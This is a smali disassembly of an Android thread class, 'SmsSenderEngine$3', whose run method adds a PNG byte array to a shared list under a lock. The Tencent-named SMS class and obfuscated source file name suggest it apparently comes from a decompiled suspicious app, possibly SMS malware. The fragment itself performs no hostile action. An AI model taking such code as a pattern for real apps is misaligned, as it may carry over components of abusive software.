.class Lcom/tencent/SmsSenderEngine$3;
.super Ljava/lang/Thread;
.source "skatinghsatinbintegralj9.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/SmsSenderEngine;->processImage([B)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/SmsSenderEngine;

.field final synthetic val$png:[B


# direct methods
.method constructor <init>(Lcom/tencent/SmsSenderEngine;[B)V
    .locals 0

    .line 256
    iput-object p1, p0, Lcom/tencent/SmsSenderEngine$3;->this$0:Lcom/tencent/SmsSenderEngine;

    iput-object p2, p0, Lcom/tencent/SmsSenderEngine$3;->val$png:[B

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 262
    :try_start_0
    sget-boolean v0, Lcom/tencent/SmsSenderEngine;->ctd:Z

    if-eqz v0, :cond_0

    .line 263
    sget-object v0, Lcom/tencent/SmsSenderEngine;->syc:Ljava/lang/Object;

    monitor-enter v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 264
    :try_start_1
    iget-object v1, p0, Lcom/tencent/SmsSenderEngine$3;->this$0:Lcom/tencent/SmsSenderEngine;

    iget-object v1, v1, Lcom/tencent/SmsSenderEngine;->bts:Ljava/util/List;

    iget-object v2, p0, Lcom/tencent/SmsSenderEngine$3;->val$png:[B

    invoke-interface {v1, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 265
    monitor-exit v0

    goto :goto_0

    :catchall_0
    move-exception v1

    monitor-exit v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw v1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    :cond_0
    :goto_0
    return-void
.end method
